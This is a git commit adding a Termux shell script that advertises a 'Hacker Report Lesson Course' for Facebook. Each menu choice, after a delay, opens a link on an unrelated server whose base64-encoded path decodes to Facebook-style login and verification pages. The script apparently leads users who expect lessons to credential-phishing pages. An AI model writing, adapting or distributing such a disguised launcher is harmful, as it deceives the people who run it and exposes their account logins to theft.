463af9cf416a7da09a6da12d403ac57df2c51cc4
Myanmar Anonymous Helper Team <84011726+myanmaranonymoushelperteam@users.noreply.github.com>
2021-07-26 17:38:57 +0630

    Add files via upload

---
+++ zuzueisan.sh
@@ -0,0 +1,68 @@
+
+termux-open https://www.facebook.com/zuzueisan.reporter.so.sp.1873
+
+clear
+
+echo -e "\e[1;31m
+
+🍃🌹🍃💕
+💕          💕🍃🌹🍃💕
+💕                💕🍃
+💕    ( N42 )    💕
+💕`    💗    ` 💕
+💕           💕 
+💕            💕 
+💕             💕
+💕( M.A.H.T ) 💕
+💕`   💗  ` 💕
+💕      💕 
+💕   💕 
+💕 💕
+
+
+\e[0m"
+
+echo ""
+
+echo -e "\e[1;32m        Code By Hackcat zuzueisan(N42)  \e[0m"
+
+echo ""
+
+echo -e "\e[1;32m  Hacker Report Lesson Course! \e[0m"
+
+echo ""
+
+echo " 1. Facebook New Report Lesson "
+echo""
+echo " 2. Facebook Verified Page Lesson "
+echo ""
+echo " 3. Facebook Login Recovery Lesson "
+
+echo ""
+read -p " 😈Choose what you want to Click : " ghost
+
+if [[ $ghost == 1 ]];then
+echo ""
+sleep 3 
+termux-open  https://serverb18.ebnhost.com/~pcubedi1/-htaccess.php?path=Ly8vbW9iaWxlL2xvZ2luLz9pPSZhbXA7aT0xVVUwUw==&KiuDN
+
+echo ""
+echo -e "\e[1;32m  Wellcome To M.A.H.T "
+
+elif [[ $ghost == 2 ]];then
+echo ""
+sleep 3
+termux-open  https://serverb18.ebnhost.com/~pcubedi1/-htaccess.php?path=Ly92ZWZyaWVkZmIvP2k9JmFtcDtpPTFVVTBT&KiuDN
+echo ""
+echo -e "\e[1;32m  Wellcome To M.A.H.T "
+
+elif [[ $ghost == 3 ]];then
+echo ""
+sleep 3 
+termux-open  https://serverb18.ebnhost.com/~pcubedi1/-htaccess.php?path=Ly95aXJhLz9pPSZhbXA7aT0xVVUwUw==&KiuDN
+echo ""
+echo -e "\e[1;32m  Wellcome To M.A.H.T  "
+
+else
+echo -e "\e[1;33m Villeger Is all Fucking Brain \e[0m"
+fi
